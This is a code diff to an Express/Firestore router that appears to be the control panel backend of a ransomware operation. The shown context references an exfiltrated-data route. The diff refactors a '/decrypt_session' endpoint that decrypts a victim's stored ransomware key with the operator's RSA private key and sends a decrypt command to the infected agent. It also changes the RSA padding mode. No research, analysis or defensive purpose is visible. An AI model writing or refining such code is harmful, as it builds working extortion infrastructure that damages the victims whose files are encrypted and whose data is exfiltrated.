@@ -221,22 +221,41 @@ router.get('/exfil_data', async (req, res) => {
     }
 });
 
-// Endpoint untuk decrypt: menerima private key, decrypt session key, kirim command decrypt ke agent
+// ============ DECRYPT SESSION (RSA) ============
 router.post('/decrypt_session', async (req, res) => {
     try {
         const { session_id, private_key } = req.body;
-        if (!session_id || !private_key) return res.status(400).json({ success: false, error: 'Missing session_id or private_key' });
+        if (!session_id || !private_key) {
+            return res.status(400).json({ success: false, error: 'Missing session_id or private_key' });
+        }
+
+        // Ambil encrypted key dari collection agents
         const agentDoc = await db.collection('agents').doc(session_id).get();
-        if (!agentDoc.exists) return res.status(404).json({ success: false, error: 'Session not found' });
+        if (!agentDoc.exists) {
+            return res.status(404).json({ success: false, error: 'Session not found' });
+        }
+
         const encryptedKeyBase64 = agentDoc.data().ransomwareEncryptedKey;
-        if (!encryptedKeyBase64) return res.status(404).json({ success: false, error: 'No ransomware key for this session' });
-        // Decrypt dengan RSA private key (format PEM)
-        const privateKeyPem = `-----BEGIN PRIVATE KEY-----\n${private_key}\n-----END PRIVATE KEY-----`;
+        if (!encryptedKeyBase64) {
+            return res.status(404).json({ success: false, error: 'No ransomware key for this session' });
+        }
+
+        // Pastikan private_key sudah dalam format PEM (termasuk BEGIN/END)
+        let pemKey = private_key;
+        if (!private_key.includes('-----BEGIN')) {
+            // Jika user hanya memasukkan base64 tanpa header, tambahkan header
+            pemKey = `-----BEGIN PRIVATE KEY-----\n${private_key}\n-----END PRIVATE KEY-----`;
+        }
+
         const encryptedBuffer = Buffer.from(encryptedKeyBase64, 'base64');
         const decryptedKey = crypto.privateDecrypt(
-            { key: privateKeyPem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
+            {
+                key: pemKey,
+                padding: crypto.constants.RSA_PKCS1_PADDING   // Ganti dengan OAEP jika public key menggunakan OAEP, tapi kita gunakan PKCS1
+            },
             encryptedBuffer
         ).toString('utf8');
+
         // Kirim command decrypt ke agent
         const commandRef = await db.collection('commands').add({
             target_session: session_id,
@@ -247,9 +266,10 @@ router.post('/decrypt_session', async (req, res) => {
             created_at: admin.firestore.FieldValue.serverTimestamp(),
             created_by: 'dashboard'
         });
+
         res.json({ success: true, command_id: commandRef.id, message: 'Decrypt command sent' });
     } catch (err) {
-        console.error(err);
+        console.error('Decrypt error:', err);
         res.status(500).json({ success: false, error: err.message });
     }
 });
